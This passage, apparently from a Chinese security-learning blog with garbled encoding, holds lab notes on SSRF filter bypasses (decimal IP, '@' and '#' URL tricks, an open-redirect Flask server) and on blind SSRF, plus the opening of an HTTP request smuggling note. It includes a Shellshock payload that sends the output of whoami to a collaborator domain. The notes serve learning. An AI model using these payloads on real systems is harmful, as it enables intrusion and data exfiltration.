<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">(127 Ã— 256Â³) <span class="code">+ (0 Ã— 256Â²) +</span> (0 Ã— 256Â¹) + (1 Ã— 256â°)</span><br><span class="line"><span class="section">= 2130706433</span></span><br></pre></td></tr></table></figure></div>
<ul>
<li>æ³¨å†Œè‡ªå·±çš„åŸŸåï¼Œè§£ææˆ<code>127.0.0.1</code></li>
<li>ä½¿ç”¨ URL ç¼–ç æˆ–å¤§å°å†™å˜ä½“æ¥æ··æ·†è¢«é˜»æ­¢çš„å­—ç¬¦ä¸²ã€‚</li>
<li>æä¾› æ§åˆ¶çš„ URLï¼Œè¯¥ URL ä¼šé‡å®šå‘åˆ°ç›®æ ‡ URLã€‚å°è¯•å¯¹ç›®æ ‡ URL ä½¿ç”¨ä¸åŒçš„é‡å®šå‘ä»£ç ä»¥åŠä¸åŒçš„åè®®ã€‚ä¾‹å¦‚ï¼Œåœ¨é‡å®šå‘æœŸé—´ä» http: åˆ‡æ¢åˆ° https: URL å·²è¢«è¯æ˜å¯ä»¥ç»•è¿‡ä¸€äº›å SSRF è¿‡æ»¤å™¨ã€‚</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask import Flask, redirect, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&#x27;/redirect&#x27;</span>)</span><br><span class="line">def ssrf_redirect():</span><br><span class="line">    target = request.args.<span class="built_in">get</span>(<span class="string">&#x27;url&#x27;</span>, <span class="string">&#x27;http://127.0.0.1&#x27;</span>)</span><br><span class="line">    return redirect(target, <span class="attribute">code</span>=302)  # å¯ä»¥æ¢æˆ 301, 307, 308</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.<span class="built_in">run</span>(<span class="attribute">host</span>=<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="attribute">port</span>=8080)  # å…è®¸å±€åŸŸç½‘è®¿é—®</span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67c312b8d0e0a243d4093536.png"><br>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œç½‘ç«™è¿‡æ»¤äº†127.0.0.1ï¼Œç”¨ä¸Šé¢çš„è¿›åˆ¶è½¬æ¢å¯ä»¥ç»•è¿‡ï¼Œç„¶åå‘ç°&#x2F;adminä¹Ÿè¢«è¿‡æ»¤ï¼Œå¯ä»¥ç”¨åŒé‡urlç¼–ç ç»•è¿‡</p>
<h3 id="å…·æœ‰åŸºäºç™½åå•çš„è¾“å…¥è¿‡æ»¤å™¨çš„-SSRF"><a href="#å…·æœ‰åŸºäºç™½åå•çš„è¾“å…¥è¿‡æ»¤å™¨çš„-SSRF" class="headerlink" title="å…·æœ‰åŸºäºç™½åå•çš„è¾“å…¥è¿‡æ»¤å™¨çš„ SSRF"></a>å…·æœ‰åŸºäºç™½åå•çš„è¾“å…¥è¿‡æ»¤å™¨çš„ SSRF</h3><p>æŸäº›åº”ç”¨ç¨‹åºä»…å…è®¸åŒ¹é…å…è®¸å€¼ç™½åå•çš„è¾“å…¥ã€‚è¿‡æ»¤å™¨å¯èƒ½ä¼šåœ¨è¾“å…¥çš„å¼€å¤´æˆ–è¾“å…¥ä¸­åŒ…å«çš„å†…å®¹ä¸­æŸ¥æ‰¾åŒ¹é…é¡¹</p>
<ul>
<li>å¯ä»¥ä½¿ç”¨<code>@</code>å­—ç¬¦å°†å‡­æ®åµŒå…¥åˆ°ä¸»æœºåå‰çš„ URL ä¸­ã€‚ï¼ˆåœ¨ URL é‡Œï¼Œ@ ä¸»è¦ç”¨äºæŒ‡å®šç”¨æˆ·åå’Œå¯†ç ï¼‰ä¾‹å¦‚ï¼š</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DTS"><figure class="iseeu highlight /dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//expected-host:fakepassword@evil-host</span></span><br></pre></td></tr></table></figure></div>
<p>æœåŠ¡å™¨å¯èƒ½è§£æ @ ä¹‹å‰çš„  ä½œä¸ºä¸»æœº</p>
<ul>
<li>å¯ä»¥ä½¿ç”¨<code>#</code>å­—ç¬¦æ¥è¡¨ç¤º URL ç‰‡æ®µã€‚ï¼ˆ<code>#</code>åçš„ç‰‡æ®µä»…ç”¨äºæµè§ˆå™¨ç«¯è§£æï¼Œä¸ä¼šè¢«å‘é€åˆ°æœåŠ¡å™¨ã€‚ï¼‰ä¾‹å¦‚ï¼š</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AVRASM"><figure class="iseeu highlight /avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">https:</span>//evil-host<span class="meta">#expected-host</span></span><br></pre></td></tr></table></figure></div>
<ul>
<li>å¯ä»¥åˆ©ç”¨ DNS å‘½åå±‚æ¬¡ç»“æ„å°†æ‰€éœ€çš„è¾“å…¥æ”¾å…¥ æ§åˆ¶çš„å®Œå…¨é™å®š DNS åç§°ä¸­ã€‚ä¾‹å¦‚</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DTS"><figure class="iseeu highlight /dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//expected-host.evil-host</span></span><br></pre></td></tr></table></figure></div>
<ul>
<li>å¯ä»¥å¯¹å­—ç¬¦è¿›è¡Œ URL ç¼–ç ï¼Œä»¥æ··æ·† URL è§£æä»£ç ã€‚å¦‚æœå®ç°è¿‡æ»¤å™¨çš„ä»£ç å¤„ç† URL ç¼–ç å­—ç¬¦çš„æ–¹å¼ä¸æ‰§è¡Œåç«¯ HTTP è¯·æ±‚çš„ä»£ç ä¸åŒï¼Œåˆ™è¿™ç§æ–¹æ³•ç‰¹åˆ«æœ‰ç”¨ã€‚ è¿˜å¯ä»¥å°è¯•å¯¹å­—ç¬¦è¿›è¡ŒåŒé‡ç¼–ç ï¼›æŸäº›æœåŠ¡å™¨ä¼šä»¥é€’å½’æ–¹å¼å¯¹æ”¶åˆ°çš„è¾“å…¥è¿›è¡Œ URL è§£ç ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´è¿›ä¸€æ­¥çš„å·®å¼‚ã€‚</li>
<li>å¯ä»¥å°†è¿™äº›æŠ€æœ¯ç»„åˆä½¿ç”¨<br>ä¸¾ä¾‹<br>å¦‚æœç›´æ¥è®¿é—®127.1ä¼šå‡ºç°<code>External stock check host must be stock.weliketoshop.net</code><br>è¯´æ˜æ˜¯ä¸€ä¸ªç™½åå•è¿‡æ»¤ï¼ŒåŸŸåä¸­å¿…é¡»å‡ºç°stock.weliketoshop.net<br>å°è¯•ä½¿ç”¨<code>http://username@stock.weliketoshop.net</code>å‘ç°æ˜¯å¯ä»¥ç”¨è¿™ç§åµŒå…¥å¼å‡­æ®çš„<br>ç°åœ¨å†å°è¯•åœ¨usernameåé¢åŠ ä¸Š#,æ‹’ç»è®¿é—®ï¼Œå°±ç”¨ä¸¤æ¬¡urlç¼–ç #<br><img src="https://pic1.imgdb.cn/item/67c31843d0e0a243d409394a.png"></li>
</ul>
<h3 id="é€šè¿‡å¼€æ”¾é‡å®šå‘ç»•è¿‡-SSRF-è¿‡æ»¤å™¨"><a href="#é€šè¿‡å¼€æ”¾é‡å®šå‘ç»•è¿‡-SSRF-è¿‡æ»¤å™¨" class="headerlink" title="é€šè¿‡å¼€æ”¾é‡å®šå‘ç»•è¿‡ SSRF è¿‡æ»¤å™¨"></a>é€šè¿‡å¼€æ”¾é‡å®šå‘ç»•è¿‡ SSRF è¿‡æ»¤å™¨</h3><p>å‡è®¾ç”¨æˆ·æäº¤çš„ URL ç»è¿‡ä¸¥æ ¼éªŒè¯ï¼Œä»¥é˜²æ­¢æ¶æ„åˆ©ç”¨ SSRF è¡Œä¸ºã€‚ä½†æ˜¯ï¼Œå…è®¸å…¶ URL çš„åº”ç”¨ç¨‹åºåŒ…å«ä¸€ä¸ªå¼€æ”¾çš„é‡å®šå‘æ¼æ´ã€‚å‡è®¾ç”¨äºå‘å‡ºåç«¯ HTTP è¯·æ±‚çš„ API æ”¯æŒé‡å®šå‘ï¼Œ å¯ä»¥æ„é€ ä¸€ä¸ªæ»¡è¶³è¿‡æ»¤å™¨çš„ URLï¼Œå¹¶å¯¼è‡´å°†è¯·æ±‚é‡å®šå‘åˆ°æ‰€éœ€çš„åç«¯ç›®æ ‡ã€‚<br>ä¾‹å¦‚ï¼Œåº”ç”¨ç¨‹åºåŒ…å«ä¸€ä¸ªå¼€æ”¾é‡å®šå‘æ¼æ´ï¼Œå…¶ä¸­ä»¥ä¸‹ URLï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DTS"><figure class="iseeu highlight /dts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">/product/</span>nextProduct?currentProductId=<span class="number">6</span><span class="variable">&amp;path</span>=http:<span class="comment">//evil-user.net</span></span><br></pre></td></tr></table></figure></div>
<p>è¿”å›é‡å®šå‘åˆ°ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DTS"><figure class="iseeu highlight /dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//evil-user.net</span></span><br></pre></td></tr></table></figure></div>
<p>æ­¤ SSRF æ¼æ´ä¹‹æ‰€ä»¥æœ‰æ•ˆï¼Œæ˜¯å› ä¸ºåº”ç”¨ç¨‹åºé¦–å…ˆéªŒè¯æä¾›çš„ stockAPI URL æ˜¯å¦ä½äºå…è®¸çš„åŸŸä¸­ï¼Œäº‹å®ç¡®å®å¦‚æ­¤ã€‚ç„¶åï¼Œåº”ç”¨ç¨‹åºè¯·æ±‚æä¾›çš„ URLï¼Œä»è€Œè§¦å‘å¼€æ”¾é‡å®šå‘ã€‚å®ƒéµå¾ªé‡å®šå‘ï¼Œå¹¶å‘æ”»å‡»è€…é€‰æ‹©çš„å†…éƒ¨ URL å‘å‡ºè¯·æ±‚ã€‚<br>ç¤ºä¾‹ï¼š<br>æ¯”å¦‚åœ¨è¿™ä¸ªå•†å“ç•Œé¢ï¼Œåœ¨æŸ¥è¯¢åº“å­˜çš„ç•Œé¢å‘ç°æ— æ³•ç›´æ¥è®¿é—®localhostï¼Œåœ¨è¿™é‡Œæ‰¾åˆ°ä¸€ä¸ªæœ‰é‡å®šå‘çš„ç•Œé¢ï¼Œè¿™é‡Œçš„ä¸‹ä¸€ä¸ªå•†å“<br><img src="https://pic1.imgdb.cn/item/67c31a8ad0e0a243d4093b5d.png"><br>é€šè¿‡æŠ“åŒ…å¯ä»¥å‘ç°è¿™é‡Œè®¿é—®çš„è·¯å¾„æ˜¯<code>/product/nextProduct?currentProductId=1&amp;path=/product?productId=2</code><br>ç°åœ¨å†å›åˆ°æŸ¥çœ‹å•†å“å‚¨å­˜çš„ç•Œé¢ï¼Œç„¶åæŠŠstockApiæ”¹æˆåˆšæ‰çš„é‡å®šå‘è·¯å¾„ï¼ŒæŠŠpathæ”¹æˆæˆ‘ä»¬æƒ³è¦çš„<br><img src="https://pic1.imgdb.cn/item/67c31d35d0e0a243d4093fde.png"></p>
<h2 id="ç›²SSRF"><a href="#ç›²SSRF" class="headerlink" title="ç›²SSRF"></a>ç›²SSRF</h2><p>å½“åº”ç”¨ç¨‹åºè¢«è¯±å¯¼å‘æä¾›çš„ URL å‘å‡ºåç«¯ HTTP è¯·æ±‚ï¼Œä½†æ˜¯åç«¯è¯·æ±‚çš„å“åº”æœªåœ¨åº”ç”¨ç¨‹åºçš„å‰ç«¯å“åº”ä¸­è¿”å›æ—¶ï¼Œå°±ä¼šå‡ºç°ç›² SSRF æ¼æ´ã€‚ç”±äºç›²ç›® SSRF æ¼æ´å…·æœ‰å•å‘æ€§ï¼Œå…¶å½±å“é€šå¸¸ä½äºå®Œå…¨çŸ¥æƒ…çš„ SSRF æ¼æ´ã€‚å®ƒä»¬ä¸èƒ½è¢«è½»æ˜“åˆ©ç”¨æ¥ä»åç«¯ç³»ç»Ÿæ£€ç´¢æ•æ„Ÿæ•°æ®ï¼Œå°½ç®¡åœ¨æŸäº›æƒ…å†µä¸‹å®ƒä»¬å¯ä»¥è¢«åˆ©ç”¨æ¥å®ç°å®Œå…¨è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p>
<p>æ£€æµ‹ç›² SSRF æ¼æ´æœ€å¯é çš„æ–¹æ³•æ˜¯ä½¿ç”¨å¸¦å¤– (OAST) æŠ€æœ¯ã€‚è¿™æ¶‰åŠå°è¯•è§¦å‘å¯¹ æ§åˆ¶çš„å¤–éƒ¨ç³»ç»Ÿçš„ HTTP è¯·æ±‚ï¼Œå¹¶ç›‘æ§ä¸è¯¥ç³»ç»Ÿçš„ç½‘ç»œäº¤äº’ã€‚å®é™…ä¸Šå°±æ˜¯è®¿é—®æˆ‘ä»¬çš„æœåŠ¡å™¨ï¼Œç„¶åä»logä¸­å¯ä»¥çœ‹åˆ°è®¿é—®ç—•è¿¹<br>å¯ä»¥ä½¿ç”¨burpsuiteçš„Burp Collaborator<br><img src="https://pic1.imgdb.cn/item/67c32195d0e0a243d40941c0.png"><br>æ¯”å¦‚è¿™é‡Œå°±æ˜¯ä¿®æ”¹RefereræˆCollaboratorä¸­çš„urlï¼Œç„¶åå°±å¯ä»¥åœ¨è®¿é—®è®°å½•ä¸­çœ‹åˆ°<br>æœåŠ¡å™¨å‘æ”»å‡»è€…æ§åˆ¶çš„ URL å‘é€è¯·æ±‚ï¼Œä½†æ”»å‡»è€…çœ‹ä¸åˆ° HTTP å“åº”ã€‚æ”»å‡»è€…æ— æ³•ç›´æ¥æ¢æµ‹å‡ºè¯·æ±‚æ˜¯å¦æˆåŠŸï¼Œæˆ–è€…è¿”å›äº†ä»€ä¹ˆæ•°æ®ã€‚ä½†ç›² SSRF ä»ç„¶å¯ä»¥ç”¨äºæ”»å‡»ï¼<br>æ”»å‡»è€…å¯ä»¥åˆ©ç”¨å®ƒæ¥æ¢æµ‹æœåŠ¡å™¨æˆ–å†…éƒ¨ç½‘ç»œä¸­çš„å…¶ä»–æ¼æ´ï¼Œä¾‹å¦‚ï¼š<br>ç«¯å£æ‰«æï¼šæ¢æµ‹æœåŠ¡å™¨æ˜¯å¦å¯ä»¥è®¿é—®æŸäº›å†…éƒ¨ IP åŠå…¶ç«¯å£ã€‚<br>æ¼æ´æ‰«æï¼šå‘é€é’ˆå¯¹å·²çŸ¥æ¼æ´çš„æ¶æ„ Payloadï¼Œçœ‹çœ‹æ˜¯å¦æœ‰å›å“ï¼ˆå¦‚ Log4jï¼‰ã€‚<br>RCEï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œï¼‰ï¼šå¦‚æœç›®æ ‡æœåŠ¡å™¨ä¸Šæœ‰æ˜“å—æ”»å‡»çš„æœåŠ¡ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ SSRF è¿›è¡Œæ”»å‡»ã€‚<br>ç¤ºä¾‹<br><img src="https://pic1.imgdb.cn/item/67c32b22d0e0a243d4094549.png"><br>è¿™é‡Œå‰é¢é€šè¿‡bpçš„æ‰«æå‘ç°user-agentå’Œrefereræœ‰æ¼æ´ï¼Œç„¶ååœ¨useragentè¿™é‡Œæ¤å…¥shellshockæ¼æ´ä»£ç <br>shellshockæ¼æ´:ï¼ŒBash <strong>åœ¨è§£æç¯å¢ƒå˜é‡æ—¶å­˜åœ¨æ¼æ´</strong>ï¼Œå¦‚æœç¯å¢ƒå˜é‡çš„å€¼ä»¥ <code>()</code> å¼€å¤´å¹¶å¸¦æœ‰ <strong>é¢å¤–çš„å‘½ä»¤</strong>ï¼ŒBash ä¼š<strong>åœ¨è§£ææ—¶æ‰§è¡Œè¿™äº›å‘½ä»¤</strong>ï¼Œå³ä½¿å®ƒä»¬ä¸åœ¨å‡½æ•°ä½“å†…ã€‚<br>    <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARCADE"><figure class="iseeu highlight /arcade"><table><tr><td class="code"><pre><span class="line">()&#123; :; &#125;; <span class="regexp">/usr/</span>bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN</span><br></pre></td></tr></table></figure></div><br>æŠŠè¿™é‡Œçš„BURP-COLLABORATOR-SUBDOMAINæ›¿æ¢æˆcollaboraterçš„urlï¼Œç„¶årefereræ›¿æ¢æˆæƒ³è¦æ‰§è¡Œç›²ssrfçš„åœ°å€ï¼Œæœ€åæŠŠåœ°å€ä¸­çš„<code>http://192.168.0.1:8080</code> ï¼Œç„¶åçªå‡ºæ˜¾ç¤º IP åœ°å€çš„æœ€åä¸€ä¸ªå…«ä½å­—èŠ‚ï¼ˆæ•°å­— 1 ï¼‰ï¼Œå•å‡»æ·»åŠ  Â§ã€‚å¼€å§‹æ”»å‡»ï¼Œæ²¡æœ‰ç¡®å®šåœ¨å“ªä¸ªip<br>æœ€åæ“ä½œç³»ç»Ÿç”¨æˆ·çš„åç§°åº”å‡ºç°åœ¨ DNS å­åŸŸä¸­ã€‚<br><img src="https://pic1.imgdb.cn/item/67c32c27d0e0a243d40945e3.png"></p>
<h2 id="å¯»æ‰¾-SSRF-æ¼æ´çš„éšè—æ”»å‡»é¢"><a href="#å¯»æ‰¾-SSRF-æ¼æ´çš„éšè—æ”»å‡»é¢" class="headerlink" title="å¯»æ‰¾ SSRF æ¼æ´çš„éšè—æ”»å‡»é¢"></a>å¯»æ‰¾ SSRF æ¼æ´çš„éšè—æ”»å‡»é¢</h2><p>è®¸å¤šæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ æ¼æ´å¾ˆå®¹æ˜“æ‰¾åˆ°ï¼Œå› ä¸ºåº”ç”¨ç¨‹åºçš„æ­£å¸¸æµé‡æ¶‰åŠåŒ…å«å®Œæ•´ URL çš„è¯·æ±‚å‚æ•°ã€‚å…¶ä»– SSRF ç¤ºä¾‹æ›´éš¾æ‰¾åˆ°ã€‚</p>
<h3 id="è¯·æ±‚ä¸­çš„éƒ¨åˆ†-URL"><a href="#è¯·æ±‚ä¸­çš„éƒ¨åˆ†-URL" class="headerlink" title="è¯·æ±‚ä¸­çš„éƒ¨åˆ† URL"></a>è¯·æ±‚ä¸­çš„éƒ¨åˆ† URL</h3><p>æœ‰æ—¶ï¼Œåº”ç”¨ç¨‹åºåªä¼šå°†ä¸»æœºåæˆ– URL è·¯å¾„çš„ä¸€éƒ¨åˆ†æ”¾å…¥è¯·æ±‚å‚æ•°ä¸­ã€‚æäº¤çš„å€¼éšåä¼šåœ¨æœåŠ¡å™¨ç«¯åˆå¹¶åˆ°è¯·æ±‚çš„å®Œæ•´ URL ä¸­ã€‚å¦‚æœè¯¥å€¼å¾ˆå®¹æ˜“è¢«è¯†åˆ«ä¸ºä¸»æœºåæˆ– URL è·¯å¾„ï¼Œåˆ™æ½œåœ¨çš„æ”»å‡»é¢å¯èƒ½å¾ˆæ˜æ˜¾ã€‚ä½†æ˜¯ï¼Œç”±äº æ— æ³•æ§åˆ¶è¯·æ±‚çš„æ•´ä¸ª URLï¼Œå› æ­¤å®Œæ•´ SSRF çš„å¯åˆ©ç”¨æ€§å¯èƒ½ä¼šå—åˆ°é™åˆ¶ã€‚</p>
<h3 id="æ•°æ®æ ¼å¼ä¸­çš„-URL"><a href="#æ•°æ®æ ¼å¼ä¸­çš„-URL" class="headerlink" title="æ•°æ®æ ¼å¼ä¸­çš„ URL"></a>æ•°æ®æ ¼å¼ä¸­çš„ URL</h3><p>æŸäº›åº”ç”¨ç¨‹åºä»¥æŸç§æ ¼å¼ä¼ è¾“æ•°æ®ï¼Œè¿™ç§æ ¼å¼çš„è§„èŒƒå…è®¸åŒ…å«æ•°æ®è§£æå™¨å¯èƒ½è¯·æ±‚çš„ URLã€‚ä¸€ä¸ªæ˜æ˜¾çš„ä¾‹å­æ˜¯ XML æ•°æ®æ ¼å¼ï¼Œå®ƒå·²å¹¿æ³›ç”¨äº Web åº”ç”¨ç¨‹åºä¸­ï¼Œç”¨äºå°†ç»“æ„åŒ–æ•°æ®ä»å®¢æˆ·ç«¯ä¼ è¾“åˆ°æœåŠ¡å™¨ã€‚å½“åº”ç”¨ç¨‹åºæ¥å— XML æ ¼å¼çš„æ•°æ®å¹¶å¯¹å…¶è¿›è¡Œè§£ææ—¶ï¼Œå®ƒå¯èƒ½å®¹æ˜“å—åˆ° XXE æ³¨å…¥çš„æ”»å‡»ã€‚å®ƒä¹Ÿå¯èƒ½å®¹æ˜“é€šè¿‡ XXE å—åˆ° SSRF çš„æ”»å‡»ã€‚</p>
<h3 id="é€šè¿‡-Referer-å¤´å‘èµ·-SSRF"><a href="#é€šè¿‡-Referer-å¤´å‘èµ·-SSRF" class="headerlink" title="é€šè¿‡ Referer å¤´å‘èµ· SSRF"></a>é€šè¿‡ Referer å¤´å‘èµ· SSRF</h3><p>ä¸€äº›åº”ç”¨ç¨‹åºä½¿ç”¨æœåŠ¡å™¨ç«¯åˆ†æè½¯ä»¶æ¥è·Ÿè¸ªè®¿é—®è€…ã€‚è¯¥è½¯ä»¶é€šå¸¸ä¼šåœ¨è¯·æ±‚ä¸­è®°å½• Referer æ ‡å¤´ï¼Œä»¥ä¾¿è·Ÿè¸ªä¼ å…¥é“¾æ¥ã€‚åˆ†æè½¯ä»¶é€šå¸¸ä¼šè®¿é—® Referer æ ‡å¤´ä¸­å‡ºç°çš„ä»»ä½•ç¬¬ä¸‰æ–¹ URLã€‚è¿™é€šå¸¸æ˜¯ä¸ºäº†åˆ†æå¼•èç½‘ç«™çš„å†…å®¹ï¼ŒåŒ…æ‹¬ä¼ å…¥é“¾æ¥ä¸­ä½¿ç”¨çš„é”šæ–‡æœ¬ã€‚å› æ­¤ï¼ŒReferer æ ‡å¤´é€šå¸¸æ˜¯ SSRF æ¼æ´çš„æœ‰ç”¨æ”»å‡»é¢ã€‚<br>åˆšæ‰çš„ç›²ssrfä¸­å°±å¾ˆå¤šåˆ©ç”¨åˆ°äº†Referer  è¿˜æœ‰user-agent</p>
]]></content>
      <categories>
        <category>æ¼æ´</category>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ç¬”è®°</tag>
        <tag>æ¼æ´</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTPè¯·æ±‚èµ°ç§æ¼æ´å­¦ä¹ </title>
    <url>/posts/51504.html</url>
    <content><![CDATA[<p>bpå®éªŒå®¤HTTPè¯·æ±‚èµ°ç§æ¼æ´å­¦ä¹ ç¬”è®°</p>
<span id="more"></span>
<h1 id="ä»€ä¹ˆæ˜¯httpè¯·æ±‚èµ°ç§"><a href="#ä»€ä¹ˆæ˜¯httpè¯·æ±‚èµ°ç§" class="headerlink" title="ä»€ä¹ˆæ˜¯httpè¯·æ±‚èµ°ç§"></a>ä»€ä¹ˆæ˜¯httpè¯·æ±‚èµ°ç§</h1><p>HTTP è¯·æ±‚èµ°ç§æ˜¯ä¸€ç§å¹²æ‰°ç½‘ç«™å¤„ç†ä»ä¸€ä¸ªæˆ–å¤šä¸ªç”¨æˆ·æ”¶åˆ°çš„ HTTP è¯·æ±‚åºåˆ—çš„æ–¹å¼çš„æŠ€æœ¯ã€‚è¯·æ±‚èµ°ç§æ¼æ´é€šå¸¸æ€§è´¨ä¸¥é‡ï¼Œå…è®¸æ”»å‡»è€…ç»•è¿‡å®‰å…¨æ§åˆ¶ã€æœªç»æˆæƒè®¿é—®æ•æ„Ÿæ•°æ®å¹¶ç›´æ¥å±å®³å…¶ä»–åº”ç”¨ç¨‹åºç”¨æˆ·ã€‚<br>è¯·æ±‚èµ°ç§ä¸»è¦ä¸ HTTP&#x2F;1 è¯·æ±‚æœ‰å…³ã€‚ä½†æ˜¯ï¼Œæ”¯æŒ HTTP&#x2F;2 çš„ç½‘ç«™ä¹Ÿå¯èƒ½å­˜åœ¨æ¼æ´ï¼Œå…·ä½“å–å†³äºå…¶åç«¯æ¶æ„ã€‚<br>ç°åœ¨çš„webåº”ç”¨åœ¨ç”¨æˆ·å’Œæœ€ç»ˆåº”ç”¨æœåŠ¡ä¸­æœ‰ä¸€ä¸ªhttpé“¾ï¼Œå°±æ˜¯ç”¨æˆ·é€šè¿‡å‰æ®µå‘é€è¯·æ±‚ï¼Œå‰ç«¯å†æŠŠè¿™ä¸ªè¯·æ±‚å‘é€ç»™ä¸€ä¸ªæˆ–è€…å¤šä¸ªåç«¯ï¼Œé€šå¸¸å‰ç«¯ä¼šå‘åç«¯å‘é€å¤šä¸ªè¯·æ±‚ï¼Œå› ä¸ºè¿™æ ·æ•ˆç‡æ›´é«˜ã€‚httpçš„è¯·æ±‚ä¼šä¸€ä¸ªæ¥ä¸€ä¸ªçš„å‘é€ï¼Œæ¥å—çš„æœåŠ¡å™¨å¿…é¡»å†³å®šä¸€ä¸ªè¯·æ±‚åœ¨å“ªé‡Œç»“æŸï¼Œä¸‹ä¸€ä¸ªè¯·æ±‚åœ¨å“ªé‡Œå¼€å§‹<br>æ‰€ä»¥åç«¯å’Œå‰ç«¯çš„è¯·æ±‚ä¹‹é—´çš„ç•Œé™å°±è¦æœ‰æ˜ç¡®è§„å®šï¼Œä¸ç„¶æ”»å‡»è€…å°±å¯ä»¥ç”¨æ¨¡ç³Šçš„è¯·æ±‚ï¼Œè®©å‰ç«¯å’Œåç«¯å¤„ç†è¯·æ±‚ä¸ä¸€æ ·<br><img src="https://pic1.imgdb.cn/item/67dc12bc88c538a9b5c210b0.png"><br>è¿™å¹…å›¾å°±æ˜¯ä¸€ä¸ªä¾‹å­ï¼Œæ”»å‡»è€…å‘é€å‰ç«¯è¯·æ±‚ï¼Œè®©åç«¯æŠŠä¸€éƒ¨åˆ†å½“ä½œäº†ä¸‹ä¸€ä¸ªè¯·æ±‚çš„å¼€å§‹ï¼Œï¼ˆæ©™è‰²éƒ¨åˆ†ï¼‰ ï¼Œ ç„¶åè¿™éƒ¨åˆ†å°±æ·»åŠ åˆ°äº†ä¸‹ä¸€ä¸ªè¯·æ±‚ä¸Šï¼Œè¿™æ ·å°±å¹²æ‰°äº†ç¨‹åºçš„æ­£å¸¸è¯·æ±‚ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªèµ°ç§æ”»å‡»ã€‚</p>
<h1 id="httpè¯·æ±‚èµ°ç§å¦‚ä½•å‡ºç°çš„"><a href="#httpè¯·æ±‚èµ°ç§å¦‚ä½•å‡ºç°çš„" class="headerlink" title="httpè¯·æ±‚èµ°ç§å¦‚ä½•å‡ºç°çš„"></a>httpè¯·æ±‚èµ°ç§å¦‚ä½•å‡ºç°çš„</h1><p>å¤§å¤šæ•° HTTP è¯·æ±‚èµ°ç§æ¼æ´çš„å‡ºç°æ˜¯å› ä¸º HTTP&#x2F;1 è§„èŒƒæä¾›äº†ä¸¤ç§ä¸åŒçš„æ–¹å¼æ¥æŒ‡å®šè¯·æ±‚çš„ç»“æŸä½ç½®ï¼š <code>Content-Length</code>æ ‡å¤´å’Œ<code>Transfer-Encoding</code>æ ‡å¤´ã€‚<br><code>Content-Lengthæ ‡å¤´å¾ˆç®€å•</code>ï¼šå®ƒæŒ‡å®šæ¶ˆæ¯æ­£æ–‡çš„é•¿åº¦ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>normal-website.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>11</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">q</span><span class="operator">=</span>smuggling</span></span><br></pre></td></tr></table></figure></div>
<p><code>Transfer-Encoding</code>æ ‡å¤´å¯ç”¨äºæŒ‡å®šæ¶ˆæ¯æ­£æ–‡ä½¿ç”¨åˆ†å—ç¼–ç ã€‚è¿™è¡¨ç¤ºæ¶ˆæ¯ä¸»ä½“åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæ•°æ®å—ã€‚æ¯ä¸ªæ•°æ®å—ç”±æ•°æ®å—å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ç»„æˆï¼ˆä»¥ åå…­è¿›åˆ¶ï¼‰ï¼Œç„¶åæ˜¯æ¢è¡Œç¬¦ï¼Œç„¶åæ˜¯å—å†…å®¹ã€‚æ¶ˆæ¯ä»¥å¤§å°ä¸ºé›¶çš„å—ç»“æŸã€‚</p>
